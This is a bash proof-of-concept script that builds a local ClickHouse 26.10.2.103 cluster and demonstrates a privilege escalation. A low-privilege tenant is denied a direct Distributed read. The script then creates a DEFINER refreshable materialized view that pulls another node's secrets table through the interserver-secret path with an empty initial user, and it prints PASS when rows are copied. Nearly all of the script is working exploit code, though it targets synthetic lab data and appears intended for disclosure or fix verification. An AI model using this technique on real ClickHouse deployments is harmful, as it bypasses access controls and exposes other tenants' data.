#!/usr/bin/env bash
# E2E PoC: ClickHouse 26.10.2.103 DEFINER refreshable MV + Distributed + interserver secret
# Privilege escalation — unauthenticated remote query via empty initial_user.
# Synthetic data only. Requires x86_64 Linux, ~500MB disk for binaries, ports 9001/9002/8123/8124/9181/9444.
set -euo pipefail
ROOT="$(cd "$(dirname "$0")" && pwd)"
BASE="$ROOT/cluster"
VER=26.10.2.103
CH_TGZ="clickhouse-common-static-${VER}-amd64.tgz"
KP_TGZ="clickhouse-keeper-${VER}-amd64.tgz"
mkdir -p "$ROOT/bins" "$ROOT/evidence" "$BASE"

need() { command -v "$1" >/dev/null || { echo "need $1"; exit 1; }; }
need curl; need tar

if [[ ! -x $BASE/opt/clickhouse-common-static-${VER}/usr/bin/clickhouse ]]; then
  mkdir -p "$BASE/opt"
  [[ -f $ROOT/bins/$CH_TGZ ]] || curl -L --retry 3 -o "$ROOT/bins/$CH_TGZ" \
    "https://packages.clickhouse.com/tgz/stable/$CH_TGZ"
  [[ -f $ROOT/bins/$KP_TGZ ]] || curl -L --retry 3 -o "$ROOT/bins/$KP_TGZ" \
    "https://github.com/ClickHouse/ClickHouse/releases/download/v${VER}-stable/$KP_TGZ"
  tar -xzf "$ROOT/bins/$CH_TGZ" -C "$BASE/opt"
  tar -xzf "$ROOT/bins/$KP_TGZ" -C "$BASE/opt"
fi
CH="$BASE/opt/clickhouse-common-static-${VER}/usr/bin/clickhouse"
KEEPER="$BASE/opt/clickhouse-keeper-${VER}/usr/bin/clickhouse-keeper"

cleanup() {
  for p in node1 node2 keeper; do
    [[ -f $BASE/run/$p.pid ]] && kill "$(cat "$BASE/run/$p.pid")" 2>/dev/null || true
  done
}
trap cleanup EXIT

rm -rf "$BASE/run"
mkdir -p "$BASE/run"/{keeper,node1,node2}

cat > "$BASE/run/keeper/keeper_config.xml" <<EOF
<clickhouse>
  <logger><level>warning</level><console>true</console></logger>
  <listen_host>127.0.0.1</listen_host>
  <keeper_server>
    <tcp_port>9181</tcp_port>
    <server_id>1</server_id>
    <log_storage_path>$BASE/run/keeper/coordination/log</log_storage_path>
    <snapshot_storage_path>$BASE/run/keeper/coordination/snapshots</snapshot_storage_path>
    <coordination_settings>
      <operation_timeout_ms>10000</operation_timeout_ms>
      <session_timeout_ms>30000</session_timeout_ms>
      <raft_logs_level>warning</raft_logs_level>
    </coordination_settings>
    <raft_configuration>
      <server><id>1</id><hostname>127.0.0.1</hostname><port>9444</port></server>
    </raft_configuration>
  </keeper_server>
</clickhouse>
EOF

make_node() {
  local name=$1 tcp=$2 http=$3 inter=$4
  mkdir -p "$BASE/run/$name"/{data,tmp,access,user_files,format_schemas,config.d}
  cat > "$BASE/run/$name/config.xml" <<EOF
<clickhouse>
  <logger><level>warning</level><console>true</console></logger>
  <path>$BASE/run/$name/data/</path>
  <tmp_path>$BASE/run/$name/tmp/</tmp_path>
  <user_files_path>$BASE/run/$name/user_files/</user_files_path>
  <format_schema_path>$BASE/run/$name/format_schemas/</format_schema_path>
  <listen_host>127.0.0.1</listen_host>
  <tcp_port>$tcp</tcp_port>
  <http_port>$http</http_port>
  <interserver_http_port>$inter</interserver_http_port>
  <interserver_http_host>127.0.0.1</interserver_http_host>
  <users_config>users.xml</users_config>
  <zookeeper><node><host>127.0.0.1</host><port>9181</port></node></zookeeper>
  <remote_servers>
    <secure>
      <secret>poc-secret-r22</secret>
      <shard><replica><host>127.0.0.1</host><port>9002</port></replica></shard>
    </secure>
  </remote_servers>
  <macros><shard>01</shard><replica>$name</replica></macros>
  <distributed_ddl><path>/clickhouse/task_queue/ddl</path></distributed_ddl>
  <mark_cache_size>536870912</mark_cache_size>
</clickhouse>
EOF
  cat > "$BASE/run/$name/users.xml" <<'UEOF'
<clickhouse>
  <profiles><default><max_memory_usage>2000000000</max_memory_usage></default></profiles>
  <users>
    <default>
      <password></password>
      <networks><ip>::/0</ip></networks>
      <profile>default</profile>
      <quota>default</quota>
      <access_management>1</access_management>
    </default>
  </users>
  <quotas><default><interval>
    <duration>3600</duration><queries>0</queries><errors>0</errors>
    <result_rows>0</result_rows><read_rows>0</read_rows><execution_time>0</execution_time>
  </interval></default></quotas>
</clickhouse>
UEOF
  cat > "$BASE/run/$name/config.d/access.xml" <<EOF
<clickhouse>
  <user_directories>
    <users_xml><path>users.xml</path></users_xml>
    <local_directory><path>$BASE/run/$name/access/</path></local_directory>
  </user_directories>
</clickhouse>
EOF
}
make_node node1 9001 8123 9009
make_node node2 9002 8124 9010

$KEEPER --config-file="$BASE/run/keeper/keeper_config.xml" >"$BASE/run/keeper/keeper.log" 2>&1 &
echo $! >"$BASE/run/keeper.pid"
sleep 2
$CH server --config-file="$BASE/run/node1/config.xml" >"$BASE/run/node1/server.log" 2>&1 &
echo $! >"$BASE/run/node1.pid"
$CH server --config-file="$BASE/run/node2/config.xml" >"$BASE/run/node2/server.log" 2>&1 &
echo $! >"$BASE/run/node2.pid"
sleep 6

N1() { $CH client --host 127.0.0.1 --port 9001 "$@"; }
N2() { $CH client --host 127.0.0.1 --port 9002 "$@"; }

VER_OUT=$(N1 -q 'SELECT version()')
echo "$VER_OUT" | tee "$ROOT/evidence/00_version.txt"
[[ "$VER_OUT" == "$VER" ]] || echo "WARN: expected $VER got $VER_OUT"

N2 -nm -q "
CREATE DATABASE lab;
CREATE USER tenant IDENTIFIED WITH plaintext_password BY 'tpass';
CREATE TABLE lab.secrets (id UInt64, payload String) ENGINE = MergeTree ORDER BY id;
INSERT INTO lab.secrets VALUES (1, 'SYNTH-SECRET-A'), (2, 'SYNTH-SECRET-B'), (3, 'SYNTH-SECRET-C');
"
N1 -nm -q "
CREATE DATABASE tenant_db;
CREATE USER tenant IDENTIFIED WITH plaintext_password BY 'tpass';
GRANT CREATE TABLE, SELECT, INSERT ON tenant_db.* TO tenant;
GRANT TABLE ENGINE ON Distributed TO tenant;
"
N1 --user tenant --password tpass -nm -q "
CREATE TABLE tenant_db.dist (id UInt64, payload String)
ENGINE = Distributed('secure', 'lab', 'secrets', rand());
CREATE TABLE tenant_db.target
(id UInt64, payload String, current_user String, authenticated_user String)
ENGINE = MergeTree ORDER BY id;
"

set +e
N1 --user tenant --password tpass -q 'SELECT * FROM tenant_db.dist' \
  >"$ROOT/evidence/01_direct_denied.txt" 2>&1
DIRECT_EC=$?
set -e
grep -q ACCESS_DENIED "$ROOT/evidence/01_direct_denied.txt" || {
  echo "FAIL: expected ACCESS_DENIED on direct Distributed read"; exit 2; }

N2 -q "ALTER USER tenant HOST LOCAL"
N1 --user tenant --password tpass -nm -q "
CREATE MATERIALIZED VIEW tenant_db.rmv REFRESH EVERY 1 YEAR APPEND TO tenant_db.target
DEFINER = CURRENT_USER SQL SECURITY DEFINER
AS SELECT id, payload, currentUser() AS current_user, authenticatedUser() AS authenticated_user
FROM tenant_db.dist;
"
set +e
N1 -q 'SYSTEM WAIT VIEW tenant_db.rmv' >"$ROOT/evidence/03_wait_view.txt" 2>&1
WAIT_EC=$?
set -e
N1 -q 'SELECT count() FROM tenant_db.target' | tee "$ROOT/evidence/04_target_count.txt"
N1 -q 'SELECT * FROM tenant_db.target ORDER BY id' | tee "$ROOT/evidence/05_target_rows.txt"
N1 -q "SELECT status, exception FROM system.view_refreshes WHERE database='tenant_db' AND view='rmv'" \
  | tee "$ROOT/evidence/06_view_refreshes.txt"

COUNT=$(cat "$ROOT/evidence/04_target_count.txt")
if [[ "$COUNT" != "0" && $WAIT_EC -eq 0 ]]; then
  echo "PASS (vulnerable): direct ACCESS_DENIED but refresh copied $COUNT rows (wait_ec=$WAIT_EC, direct_ec=$DIRECT_EC)"
  echo "Empty current_user/authenticated_user columns confirm interserver unauthenticated mode."
  exit 0
else
  echo "FIXED-or-unexpected: count=$COUNT wait_ec=$WAIT_EC"
  exit 1
fi
